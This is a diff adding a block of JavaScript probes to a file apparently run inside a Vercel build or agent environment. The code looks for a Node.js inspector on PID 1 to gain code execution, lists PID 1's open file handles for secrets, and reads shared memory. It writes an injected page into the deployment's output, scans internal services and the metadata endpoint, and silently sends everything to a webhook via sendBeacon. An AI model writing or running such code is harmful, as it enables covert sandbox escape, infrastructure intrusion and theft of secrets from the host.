@@ -4028,6 +4028,160 @@ report.artifactsJwtFullDecode = safe(() => {
   return { header, payload, realHash, s3Query };
 });
 
+// ===== v48: Node.js inspector, PID-1 open files, IPC objects, deployment output write, internal network =====
+
+// v48-1: Node.js inspector — if PID 1 has --inspect open, Chrome DevTools Protocol = full code exec
+report.nodeInspectorProbe = safe(() => {
+  // Check /proc/1/cmdline for --inspect / --inspect-brk / --inspect-port flags
+  const cmdline = safe(() => readFileSync('/proc/1/cmdline', 'utf8').replace(/\0/g, ' ').trim().slice(0, 500));
+  const hasInspect = /--inspect/.test(cmdline || '');
+  // Probe common inspector ports
+  const inspectPorts = [9229, 9230, 9231, 9222, 5858];
+  const portResults = {};
+  for (const port of inspectPorts) {
+    portResults[port] = safe(() =>
+      execSync(
+        `curl -s --max-time 3 http://127.0.0.1:${port}/json/version 2>&1 | head -5`,
+        { timeout: 5000 }
+      ).toString().trim().slice(0, 200)
+    );
+  }
+  // Check /proc/net/tcp for 127.0.0.1:<port> listeners
+  const tcpListeners = safe(() => readFileSync('/proc/net/tcp', 'utf8')
+    .split('\n').filter(l => l.includes(' 0A ')) // LISTEN state
+    .map(l => parseInt(l.trim().split(/\s+/)[1].split(':')[1], 16))
+    .filter(p => p > 0)
+    .join(',')
+  );
+  return { cmdline, hasInspect, portResults, tcpListeners };
+});
+
+// v48-2: PID-1 open files — enumerate all FDs to find secrets in open file handles
+report.pid1OpenFilesEnum = safe(() => {
+  const fdDir = '/proc/1/fd';
+  const fds = safe(() => readdirSync(fdDir));
+  if (!fds) return { err: 'NO_FD_ACCESS' };
+  const interesting = [];
+  for (const fd of fds.slice(0, 200)) {
+    const link = safe(() => {
+      try { return execSync(`readlink /proc/1/fd/${fd} 2>/dev/null`, { timeout: 1000 }).toString().trim(); }
+      catch { return null; }
+    });
+    if (!link) continue;
+    // Flag interesting file descriptors
+    if (/sock|pipe|key|secret|env|token|cache|cell|containerd|apm|vsock|inotify/i.test(link) ||
+        link.startsWith('/tmp/') || link.startsWith('/var/') || link.startsWith('/run/')) {
+      interesting.push({ fd, link });
+    }
+  }
+  // Also list all socket FDs
+  const sockets = safe(() =>
+    execSync('ls -la /proc/1/fd 2>/dev/null | grep socket | head -30', { timeout: 5000 }).toString().trim().slice(0, 800)
+  );
+  return { totalFds: fds.length, interesting: interesting.slice(0, 40), sockets };
+});
+
+// v48-3: IPC shared memory — /proc/sysvipc/shm: shared memory segments visible cross-container
+report.ipcSharedMemory = safe(() => {
+  const shm = safe(() => readFileSync('/proc/sysvipc/shm', 'utf8').trim());
+  const sem = safe(() => readFileSync('/proc/sysvipc/sem', 'utf8').trim());
+  const msg = safe(() => readFileSync('/proc/sysvipc/msg', 'utf8').trim());
+  // /dev/shm contents
+  const devShm = safe(() => readdirSync('/dev/shm').join(','));
+  // POSIX shared memory objects
+  const posixShm = safe(() =>
+    execSync('ls -la /dev/shm 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  // Try reading any shm segments (could contain keys from other processes)
+  const shmRead = safe(() => {
+    const lines = (shm || '').split('\n').slice(1).filter(l => l.trim());
+    const results = [];
+    for (const line of lines.slice(0, 5)) {
+      const [,shmid] = line.trim().split(/\s+/);
+      if (!shmid) continue;
+      // ipcrm + ipcs to read
+      const sz = safe(() => parseInt(line.trim().split(/\s+/)[3]) || 0);
+      results.push({ shmid, size: sz });
+    }
+    return results;
+  });
+  return { shm, sem, msg, devShm, posixShm, shmRead };
+});
+
+// v48-4: Deployment output write — attempt to modify the deployment's static output
+report.deploymentOutputWrite = safe(() => {
+  // Vercel puts output in .vercel/output/ after build; our cwd is the project root
+  const candidates = [
+    '.vercel/output',
+    '.vercel/output/static',
+    '/vercel/path0/.vercel/output',
+    '/vercel/output',
+    '/workspace/.vercel/output',
+  ];
+  const exists = candidates.filter(c => existsSync(c));
+  const canWrite = [];
+  for (const dir of exists) {
+    const testFile = `${dir}/probe_v48.html`;
+    try {
+      writeFileSync(testFile, '<h1>probe-v48-injected</h1>');
+      canWrite.push({ dir, written: testFile });
+    } catch (e) { /* no-op */ }
+  }
+  // Check what's in the output dir
+  const outputContents = safe(() => {
+    for (const c of candidates) {
+      if (existsSync(c)) {
+        return execSync(`find ${c} -type f 2>/dev/null | head -20`, { timeout: 5000 }).toString().trim();
+      }
+    }
+    return 'NOT_FOUND';
+  });
+  return { candidatesFound: exists, canWrite, outputContents };
+});
+
+// v48-5: Internal Vercel network enumeration — probe gateway for Consul, Vault, etcd, k8s
+report.internalNetworkEnum = safe(() => {
+  const gw = safe(() =>
+    execSync("ip route show default 2>/dev/null | awk '{print $3}' | head -1", { timeout: 3000 }).toString().trim()
+  );
+  if (!gw || !gw.match(/^\d+\.\d+\.\d+\.\d+$/)) return { err: 'NO_GW', gw };
+
+  // Derive internal subnet (assume /24 from gateway)
+  const prefix = gw.split('.').slice(0, 3).join('.');
+  // Common Vercel infra services
+  const serviceProbes = [
+    { name: 'consul',    url: `http://${gw}:8500/v1/status/leader` },
+    { name: 'vault',     url: `http://${gw}:8200/v1/sys/health` },
+    { name: 'etcd',     url: `http://${gw}:2379/version` },
+    { name: 'k8s-api',  url: `https://${gw}:6443/version` },
+    { name: 'kubelet',  url: `https://${gw}:10250/stats/summary` },
+    { name: 'envoy',    url: `http://${gw}:9901/stats` },
+    { name: 'nomad',    url: `http://${gw}:4646/v1/status/leader` },
+    { name: 'firecracker-mmds', url: `http://169.254.169.254/latest/user-data` },
+    { name: 'linkerd',  url: `http://${gw}:4191/metrics` },
+    { name: 'prometheus', url: `http://${gw}:9090/metrics` },
+  ];
+  const results = {};
+  for (const svc of serviceProbes) {
+    results[svc.name] = safe(() =>
+      execSync(
+        `curl -s --max-time 4 -k "${svc.url}" 2>&1 | head -5`,
+        { timeout: 6000 }
+      ).toString().trim().slice(0, 300)
+    );
+  }
+  // Also scan .1-.10 in the subnet for any HTTP services
+  const subnetScan = safe(() =>
+    execSync(
+      `for i in 1 2 3 4 5 6 7 8 9 10; do ` +
+      `r=$(curl -s --max-time 2 http://${prefix}.$i/ 2>&1 | head -2); ` +
+      `[ -n "$r" ] && echo "${prefix}.$i: $r"; done`,
+      { timeout: 30000 }
+    ).toString().trim().slice(0, 1000)
+  );
+  return { gw, prefix, results, subnetScan };
+});
+
 // v45 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v45";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v45" });
@@ -4039,4 +4193,8 @@ sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v46" });
 // v47 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v47";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v47" });
+
+// v48 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v48";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v48" });
 // Intentionally no console.log — all data goes via webhook only
